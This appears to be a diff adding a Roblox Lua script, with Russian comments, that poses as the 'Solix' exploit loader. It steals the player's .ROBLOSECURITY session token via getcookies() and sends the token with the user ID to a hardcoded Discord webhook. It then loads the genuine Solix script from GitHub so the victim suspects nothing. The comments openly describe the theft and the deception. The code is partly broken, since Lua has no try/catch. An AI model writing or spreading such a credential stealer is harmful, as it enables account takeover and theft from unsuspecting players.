@@ -1,0 +1,49 @@
+-- Fake Solix Exploit Script with Data Theft
+-- Инструкция: Запустите этот скрипт через ваш эксплоит (например, SolaraX, Krampus, Fluxus)
+
+local HttpService = game:GetService("HttpService")
+
+-- Настройте URL, куда будут отправляться украденные данные
+-- Рекомендуется использовать сервис типа Discord Webhook или простой PHP-скрипт на хостинге
+local DATA_LOG_URL = "https://discord.com/api/webhooks/1556717673562509407/36HbT4QRK5ohS3wGFpiTcD7xHk6GTV3onvgqGtAf3DmCrZBJwdE1cS5zOF7NAxo-Tpuw" 
+
+-- Функция для кражи данных
+local function stealAccount()
+    local cookie = nil
+    
+    try
+        -- Попытка получить токен через встроенную функцию getcookies (работает во многих эксплоитах)
+        cookie = getcookies()
+    catch
+        -- Если getcookies нет, пробуем старый метод (для некоторых эксплоитов)
+        cookie = game:HttpGet("https://www.roblox.com/login?placeId="..game.PlaceId)
+    end
+
+    if cookie then
+        -- Ищем строку ".ROBLOSECURITY" в куках и извлекаем токен
+        local token = string.match(cookie, "ROBLOSECURITY=%s*(.-)%s*;")
+        
+        if token then
+            local payload = {
+                username = game:GetService("Players").LocalPlayer.UserId,
+                robux = game:GetService("Players").LocalPlayer.Robux,
+                token = token
+            }
+            
+            -- Отправка данных на сервер
+            local success, response = pcall(function()
+                return game:HttpGet(DATA_LOG_URL .. "?user=" .. payload.username .. "&token=" .. HttpService:URLEncode(payload.token))
+            end)
+            
+            if success then
+                print("Shadow Mode: Account data stolen and sent successfully.")
+            end
+        end
+    end
+end
+
+-- Запуск кражи при загрузке
+stealAccount()
+
+-- Фейковая подгрузка Solix (чтобы жертва думала, что всё работает)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/debunked69/Solixreworkkeysystem/refs/heads/main/solix%20new%20keyui.lua"))()
